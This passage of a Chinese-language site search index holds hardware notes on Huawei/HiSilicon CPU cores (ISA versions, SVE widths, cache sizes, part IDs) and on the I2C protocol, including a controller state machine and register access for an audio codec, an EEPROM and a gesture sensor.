0xd03\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> <li>128KB L1 Cache, 1MB L2 Cache</li> <li>\u200b\u7591\u4f3c\u200b hip10 \u200b\u548c\u200b hip10a \u200b\u662f\u200b\u540c\u4e00\u4e2a\u200b</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip10a machine discription</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#hip10c","title":"hip10c","text":"<ul> <li>ARMv8.5-A</li> <li>SVE (256 bits)</li> <li>part id 0xd45</li> <li>96KB L1 Cache, 1MB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip10c machine discription part id 0xddd</li> <li>Add hip10a machine discription part id changes from 0xddd to 0xd45</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#hip11","title":"hip11","text":"<ul> <li>ARMv8.5-A</li> <li>SVE + SVE2 (512 bits)</li> <li>part id 0xd22</li> <li>64KB L1 Cache, 512KB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip11 CPU pipeline scheduling</li> <li>[SME] Recover hip09 and hip11 in aarch64-cores.def</li> <li>SVE_512</li> </ul>"},{"location":"hardware/huawei.html#hip12","title":"hip12","text":"<ul> <li>ARMv9.2-A</li> <li>SVE + SVE2 (256 bits)</li> <li>part id 0xd06</li> <li>128KB L1 Cache, 1MB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>Add hip12 core definition and cost model</li> <li>Add hip12 instructions pipeline</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920b","title":"Kunpeng 920B","text":"<ul> <li>Kunpeng 920 V200 7270Z</li> <li>64 cores/socket</li> <li>SVE</li> <li>SMT2</li> <li>2.9 GHz</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt pacg dcpodp flagm2 frint svei8mm svef32mm svef64mm svebf16 i8mm bf16 dgh rng ecv</li> <li>\u200b\u7591\u4f3c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b hip09</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u9cb2\u9e4f\u200b 920B 8C8G \u200b\u89c4\u683c\u200b\u865a\u673a\u200b\u8dd1\u200b MySQL \u200b\u7ed1\u200b\u6838\u200b\u6027\u80fd\u200b\u5dee\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e0d\u200b\u7ed1\u200b\u6838\u200b\u6027\u80fd\u200b\u7684\u200b 1/20</li> <li>EulerOS V2.0SP11 \u200b\u652f\u6301\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u7c7b\u578b\u200b</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920c","title":"Kunpeng 920C","text":"<ul> <li>Server Types Supported by EulerOS V2.0SP12</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920e","title":"Kunpeng 920E","text":"<ul> <li>Server Types Supported by EulerOS V2.0SP12</li> </ul>"},{"location":"hardware/huawei.html#part-id","title":"part id \u200b\u5217\u8868","text":"<p>implementer 0x48</p> <p>part id:</p> <ul> <li>0xd01: hip08</li> <li>0xd02: Kirin 9000s/hip09</li> <li>0xd03: Kirin 9010/hip10/hip10a/Kirin x90</li> <li>0xd05: Kirin 9020</li> <li>0xd06: hip12</li> <li>0xd22: hip11</li> <li>0xd42: Kirin 9000s/Kirin 9010/Kirin x90</li> <li>0xd43: Kirin x90</li> <li>0xd45: hip10c</li> </ul>"},{"location":"hardware/i2c.html","title":"I2C (Inter-Integrated Circuit)","text":""},{"location":"hardware/i2c.html#_1","title":"\u63a5\u53e3","text":"<p>I2C \u200b\u534f\u8bae\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e24\u4e2a\u200b\u4fe1\u53f7\u200b\uff1a</p> <ul> <li>SCL: \u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>SDA\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cMaster &lt;-&gt; Slave</li> </ul> <p>\u200b\u7531\u4e8e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0c\u200b\u6240\u4ee5\u200b SDA \u200b\u7531\u200b Master \u200b\u548c\u200b Slave \u200b\u8f6e\u6d41\u200b\u8f93\u51fa\u200b\u3002\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5f00\u59cb\u200b\u6761\u4ef6\u200b\u662f\u200b\uff0cSDA \u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u4e4b\u540e\u200b SCL \u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\u3002\u200b\u5f00\u59cb\u200b\u8bf7\u6c42\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6bcf\u6b21\u200b SCL \u200b\u4e0a\u5347\u200b\u6cbf\u200b\u91c7\u6837\u200b\u4e00\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u8bf7\u6c42\u200b\u7ed3\u675f\u200b\u65f6\u200b\uff0cSCL \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u7136\u540e\u200b SDA \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\u3002\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>idle \u200b\u9636\u6bb5\u200b\uff0cscl \u200b\u548c\u200b sda \u200b\u90fd\u200b\u662f\u200b 1</li> <li>start \u200b\u9636\u6bb5\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b sda \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b scl \u200b\u53d8\u6210\u200b 0</li> <li>data/ack \u200b\u9636\u6bb5\u200b\uff0c\u200b\u5728\u200b scl \u200b\u4e0a\u5347\u200b\u6cbf\u200b\u91c7\u6837\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b scl \u200b\u4e0b\u964d\u200b\u6cbf\u200b\uff08\u200b\u51c6\u786e\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff09\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>stop \u200b\u9636\u6bb5\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b scl \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b sda \u200b\u53d8\u6210\u200b 1</li> </ol> <p>\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b sda \u200b\u5728\u200b scl \u200b\u6b63\u534a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\u3002\u200b\u5982\u679c\u200b\u53d8\u200b\u4e86\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b start \u200b\u6216\u8005\u200b stop\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5728\u200b data/ack \u200b\u9636\u6bb5\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4fdd\u8bc1\u200b sda \u200b\u7684\u200b\u53d8\u5316\u200b\u76f8\u6bd4\u200b scl \u200b\u4e0b\u964d\u200b\u6cbf\u6709\u200b\u4e00\u4e2a\u200b\u5ef6\u8fdf\u200b\uff08Hold Time\uff0c\u200b\u4e00\u822c\u200b\u7684\u200b\u8981\u6c42\u200b\u662f\u200b Min 0us\uff09\u3002\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u53ef\u80fd\u200b\u662f\u200b\u5728\u200b\u5206\u9891\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5148\u62c9\u4f4e\u200b scl\uff0c\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u518d\u200b\u4fee\u6539\u200b sda\u3002</p> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b data/ack \u200b\u6307\u200b\u7684\u200b\u5219\u200b\u662f\u200b\u4f20\u8f93\u200b\u7684\u200b\u5177\u4f53\u5185\u5bb9\u200b\uff1a\u200b\u4f8b\u5982\u200b master \u200b\u8981\u200b\u4f20\u8f93\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u8bfb\u200b\u4f7f\u200b\u80fd\u200b\uff0c\u200b\u54cd\u5e94\u200b\u5730\u5740\u200b\u7684\u200b slave \u200b\u8981\u200b\u8fd4\u56de\u200b ack\uff1b\u200b\u4e4b\u540e\u200b\uff0c\u200b\u65e0\u8bba\u662f\u200b master \u200b\u8fd8\u662f\u200b slave \u200b\u53d1\u9001\u6570\u636e\u200b\uff0c\u200b\u63a5\u6536\u200b\u7684\u200b\u4e00\u65b9\u200b\u90fd\u200b\u8981\u200b\u8fd4\u56de\u200b ack\u3002ack \u200b\u662f\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0c\u200b\u610f\u5473\u7740\u200b 0 \u200b\u8868\u793a\u200b\u6210\u529f\u200b\uff08ack\uff09\uff0c1 \u200b\u8868\u793a\u200b\u5931\u8d25\u200b\uff08nack\uff09\u3002</p> <p>\u200b\u7531\u4e8e\u200b sda \u200b\u5e26\u6709\u200b\u4e0a\u62c9\u200b\u7535\u963b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b slave \u200b\u54cd\u5e94\u200b\uff0cack \u200b\u9636\u6bb5\u200b\u7684\u200b sda \u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b 1\uff0c\u200b\u610f\u5473\u7740\u200b\u5931\u8d25\u200b\uff08nack\uff09\u3002</p>"},{"location":"hardware/i2c.html#i2c","title":"I2C \u200b\u63a7\u5236\u5668\u200b\u5b9e\u73b0","text":"<p>\u200b\u7ed3\u5408\u200b\u4e0a\u9762\u200b\u7684\u200b I2C \u200b\u6ce2\u5f62\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u72b6\u6001\u673a\u200b\uff1a</p> <ol> <li>INIT \u200b\u72b6\u6001\u200b\uff1a\u200b\u521d\u59cb\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cSCL \u200b\u548c\u200b SDA \u200b\u90fd\u200b\u4e3a\u200b 1\uff0c\u200b\u8981\u200b\u53d1\u9001\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b START1 \u200b\u72b6\u6001\u200b</li> <li>START1 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SDA=0\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b START2 \u200b\u72b6\u6001\u200b</li> <li>START2 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SCL=0\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSTART \u200b\u53d1\u9001\u200b\u5b8c\u6210\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b SEND \u200b\u72b6\u6001\u200b</li> <li>SEND \u200b\u72b6\u6001\u200b\uff1a\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSCL \u200b\u53d6\u53cd\u200b\uff0c\u200b\u5982\u679c\u200b SCL \u200b\u8981\u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u5ef6\u8fdf\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u518d\u200b\u8f93\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u200b SDA \u200b\u4e0a\u200b\uff0c\u200b\u4fdd\u8bc1\u200b SDA \u200b\u7684\u200b\u53d8\u5316\u200b\u5728\u200b SCL \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff1b\u200b\u540c\u65f6\u200b\u7edf\u8ba1\u200b\u4f20\u8f93\u200b\u4f4d\u6570\u200b\uff0c\u200b\u6bcf\u200b\u4f20\u8f93\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u5c31\u8981\u200b\u7b49\u5f85\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u8ba9\u200b Slave \u200b\u54cd\u5e94\u200b ACK\uff0c\u200b\u6b64\u65f6\u200b\u8981\u200b\u8bbe\u7f6e\u200b inout \u200b\u8f93\u51fa\u200b\u4e3a\u200b\u9ad8\u200b\u963b\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u8981\u200b\u8f6c\u6362\u200b\u4f20\u8f93\u200b\u65b9\u5411\u200b\uff0c\u200b\u5373\u200b Master \u200b\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8f6c\u79fb\u200b\u5230\u200b RECV \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP1 \u200b\u72b6\u6001\u200b</li> <li>RECV \u200b\u72b6\u6001\u200b\uff1a\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSCL \u200b\u53d6\u53cd\u200b\uff0c\u200b\u5982\u679c\u200b SCL \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u5bf9\u200b SDA \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\u5e76\u4e14\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff1b\u200b\u540c\u65f6\u200b\u7edf\u8ba1\u200b\u4f20\u8f93\u200b\u4f4d\u6570\u200b\uff0c\u200b\u6bcf\u200b\u4f20\u8f93\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u5c31\u8981\u200b\u5728\u200b SDA \u200b\u8f93\u51fa\u200b\u4e00\u6b21\u200b ACK\uff1b\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP1 \u200b\u72b6\u6001\u200b</li> <li>STOP1 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SCL=1\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP2 \u200b\u72b6\u6001\u200b</li> <li>STOP2 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SDA=1\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b INIT \u200b\u72b6\u6001\u200b</li> </ol> <p>\u200b\u5206\u9891\u200b\u662f\u56e0\u4e3a\u200b\u4e00\u822c\u200b I2C \u200b\u7684\u200b\u9891\u7387\u200b\u6bd4\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u662f\u200b kHz \u200b\u7684\u200b\u91cf\u7ea7\u200b\u3002\u200b\u9700\u8981\u200b\u6309\u7167\u200b\u63a7\u5236\u200b\u903b\u8f91\u200b\u7684\u200b\u4e3b\u9891\u200b\uff0c\u200b\u7ed3\u5408\u200b\u5916\u8bbe\u200b\u80fd\u200b\u63a5\u53d7\u200b\u7684\u200b I2C \u200b\u9891\u7387\u200b\u8303\u56f4\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5206\u9891\u200b\u7684\u200b\u500d\u6570\u200b\u3002</p>"},{"location":"hardware/i2c.html#_2","title":"\u4e0a\u5c42\u200b\u534f\u8bae","text":"<p>\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e0a\u5c42\u200b\u534f\u8bae\u200b\uff0c\u200b\u4f8b\u5982\u200b WM8731\uff0c\u200b\u652f\u6301\u200b\u901a\u8fc7\u200b I2C \u200b\u5199\u5165\u200b\u5185\u90e8\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e00\u6b21\u200b\u5199\u200b\u64cd\u4f5c\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>start</li> <li>master \u200b\u53d1\u9001\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\u548c\u200b 0\uff08\u200b\u8868\u793a\u200b\u5199\u200b\uff09\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>master \u200b\u53d1\u9001\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b \u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>master \u200b\u53d1\u9001\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>stop</li> </ol> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7b2c\u4e8c\u6b65\u200b\u53d1\u9001\u200b\u7684\u200b 7 \u200b\u4f4d\u200b\u5730\u5740\u200b + \u200b\u8bfb\u200b/\u200b\u5199\u4f4d\u200b\u662f\u200b\u6807\u51c6\u200b\u7684\u200b\uff0cI2C Slave \u200b\u90fd\u200b\u4f1a\u200b\u6839\u636e\u200b 7 \u200b\u4f4d\u200b\u5730\u5740\u200b\u6765\u200b\u51b3\u5b9a\u200b\u662f\u5426\u200b\u7531\u200b\u81ea\u5df1\u200b\u6765\u200b\u54cd\u5e94\u200b\u3002\u200b\u6b64\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5219\u200b\u662f\u200b\u5404\u4e2a\u200b\u82af\u7247\u200b\u6309\u7167\u200b\u5404\u81ea\u200b\u7684\u200b\u534f\u8bae\u200b\u6765\u200b\u8fdb\u884c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u591a\u4e2a\u200b\u540c\u578b\u53f7\u200b I2C \u200b\u82af\u7247\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\uff0c\u200b\u901a\u5e38\u200b\u82af\u7247\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u6765\u200b\u914d\u7f6e\u200b\u5b83\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u200b\u4e0d\u540c\u200b\u7684\u200b\u82af\u7247\u200b\u8bbe\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5c31\u200b\u89e3\u51b3\u200b\u4e86\u200b\u5730\u5740\u200b\u51b2\u7a81\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/i2c.html#i2c-eeprom","title":"I2C EEPROM","text":"<p>\u200b\u4ee5\u200b AT24C32/AT24C64 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b I2C \u200b\u63a5\u53e3\u200b\u7684\u200b EEPROM\uff0c\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <p>\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cACK\uff1b\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u6570\u636e\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\uff0cack\uff1b\u200b\u6700\u7ec8\u200b stop\u3002</p> <p>\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b\u200b\u8bfb\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u8bfb\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1bstart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cR\uff0cack\uff1b\u200b\u6570\u636e\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\uff0cack\uff1b\u200b\u6700\u7ec8\u200b\u4e0d\u60f3\u200b\u8bfb\u200b\u7684\u200b\u65f6\u5019\u200b nack\uff0cstop\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8bbe\u8ba1\u200b\u6210\u5199\u200b\u64cd\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b Master \u200b\u5230\u200b Slave \u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\uff0c\u200b\u53cd\u8fc7\u6765\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b Slave \u200b\u5230\u200b Master \u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4f20\u8f93\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8981\u200b\u9996\u5148\u200b\u201c\u200b\u5199\u5165\u200b\u201d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u8bfb\u51fa\u6765\u200b\u3002</p>"},{"location":"hardware/i2c.html#i2c-audio-codec","title":"I2C Audio Codec","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\u7684\u200b WM8731 \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b Audio Codec\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b I2C \u200b\u5bf9\u200b\u5176\u200b\u5bc4\u5b58\u5668\u200b\u8fdb\u884c\u200b\u5199\u5165\u200b\u3002WM8731 \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b\u6709\u200b 9 \u200b\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u6709\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5199\u5165\u200b\u6d41\u7a0b\u200b\u662f\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b7 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b\uff0c1 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cack\uff1bstop\u3002</p>"},{"location":"hardware/i2c.html#i2c-sensor","title":"I2C Sensor","text":"<p>\u200b\u4e3e\u200b\u4e00\u4e2a\u200b\u4f20\u611f\u5668\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1aPAJ7620U2: Integrated Gesture Recognition Sensor \uff0c\u200b\u5b83\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u8bfb\u5199\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <p>\u200b\u5355\u6b21\u200b\u5199\u5165\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0cack\uff1b8 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0cack\uff1bstop\u3002</p> <p>\u200b\u5355\u6b21\u200b\u8bfb\u53d6\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0cack\uff1bstop\uff1bstart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cR\uff0cack\uff1b8 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0cnack\uff1bstop\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b\u8bfb\u53d6\u200b\u4e5f\u200b\u62c6\u6210\u200b\u4e86\u200b\u4e24\u6b65\u200b\uff1a\u200b\u7b2c\u4e00\u6b65\u200b\u201c\u200b\u5199\u5165\u200b\u201d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u7b2c\u4e8c\u6b65\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6570\u636e\u200b\u3002\u200b\u6700\u540e\u200b\u7684\u200b nack \u200b\u8868\u793a\u200b master \u200b\u4e0d\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u6279\u91cf\u200b\u8bfb\u53d6\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u8981\u200b\u5728\u200b\u5355\u6b21\u200b\u8bfb\u53d6\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\u53d1\u200b ack\uff0c\u200b\u7b49\u5230\u200b\u4e0d\u200b\u9700\u8981\u200b\u7ee7\u7eed\u200b\u8bfb\u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u53d1\u200b nack\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u8bfb\u53d6\u200b\u591a\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u8fd9\u4e9b\u200b\u547d\u4ee4\u200b\u683c\u5f0f\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b I2C EEPROM \u200b\u57fa\u672c\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u3002</p> <p>\u200b\u989c\u8272\u200b\u4f20\u611f\u5668\u200b TCS3472 \u200b\u7684\u200b\u547d\u4ee4\u200b\u683c\u5f0f\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/i2c.html#dual-slave-address","title":"Dual Slave Address","text":"<p>I2C \u200b\u7684\u200b\u6bcf\u4e2a\u200b slave \u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e0d\u540c\u200b slave \u200b\u7684\u200b\u5730\u5740\u200b\u5e94\u8be5\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u3002\u200b\u4f46\u200b\u5047\u5982\u200b\u8981\u200b\u7528\u200b\u591a\u4e2a\u200b\u540c\u578b\u53f7\u200b\u7684\u200b\u82af\u7247\u200b\uff0c\u200b\u600e\u4e48\u529e\u200b\uff1f\u200b\u6240\u4ee5\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u7684\u200b slave 